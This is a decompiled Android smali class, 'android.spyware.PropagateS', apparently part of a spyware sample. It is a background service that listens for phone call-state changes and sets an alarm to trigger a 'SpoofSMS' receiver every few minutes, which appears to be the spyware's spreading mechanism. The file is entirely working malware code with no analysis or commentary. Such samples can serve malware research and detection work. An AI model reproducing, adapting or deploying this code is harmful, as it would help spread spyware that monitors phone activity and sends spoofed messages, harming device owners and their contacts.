.class public Landroid/spyware/PropagateS;
.super Landroid/app/Service;
.source "PropagateS.java"


# static fields
.field private static prevState:I


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 26
    const/4 v0, 0x0

    sput v0, Landroid/spyware/PropagateS;->prevState:I

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000()I
    .registers 1

    .prologue
    .line 25
    sget v0, Landroid/spyware/PropagateS;->prevState:I

    return v0
.end method

.method static synthetic access$002(I)I
    .registers 1
    .param p0, "x0"    # I

    .prologue
    .line 25
    sput p0, Landroid/spyware/PropagateS;->prevState:I

    return p0
.end method

.method static synthetic access$100(Landroid/spyware/PropagateS;)V
    .registers 1
    .param p0, "x0"    # Landroid/spyware/PropagateS;

    .prologue
    .line 25
    invoke-direct {p0}, Landroid/spyware/PropagateS;->setAlarm()V

    return-void
.end method

.method private setAlarm()V
    .registers 9

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 73
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 74
    .local v2, "nextAlarm":Ljava/util/Calendar;
    const/4 v4, 0x5

    invoke-virtual {v2, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 76
    new-instance v1, Landroid/content/Intent;

    iget-object v4, p0, Landroid/spyware/PropagateS;->context:Landroid/content/Context;

    const-class v5, Landroid/spyware/SpoofSMSR;

    invoke-direct {v1, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 77
    .local v1, "intent":Landroid/content/Intent;
    iget-object v4, p0, Landroid/spyware/PropagateS;->context:Landroid/content/Context;

    const/high16 v5, 0x40000000    # 2.0f

    invoke-static {v4, v6, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 79
    .local v3, "pIntent":Landroid/app/PendingIntent;
    iget-object v4, p0, Landroid/spyware/PropagateS;->context:Landroid/content/Context;

    const-string v5, "alarm"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 80
    .local v0, "am":Landroid/app/AlarmManager;
    invoke-virtual {v2}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 83
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "::INF  SpoofSMS alarm set for: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xa

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 84
    invoke-virtual {v2, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 83
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 86
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 96
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 5

    .prologue
    .line 31
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 34
    const-string v2, "::trace"

    const-string v3, "::INF  Propagate service running..."

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 36
    invoke-virtual {p0}, Landroid/spyware/PropagateS;->getApplication()Landroid/app/Application;

    move-result-object v2

    iput-object v2, p0, Landroid/spyware/PropagateS;->context:Landroid/content/Context;

    .line 38
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Landroid/spyware/PropagateS;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 39
    .local v1, "mTelephonyMgr":Landroid/telephony/TelephonyManager;
    new-instance v0, Landroid/spyware/PropagateS$1;

    invoke-direct {v0, p0}, Landroid/spyware/PropagateS$1;-><init>(Landroid/spyware/PropagateS;)V

    .line 68
    .local v0, "listener":Landroid/telephony/PhoneStateListener;
    const/16 v2, 0x20

    invoke-virtual {v1, v0, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    .line 69
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .prologue
    .line 91
    const-string v0, "::trace"

    const-string v1, "::INF  Propagate service terminated."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 92
    return-void
.end method
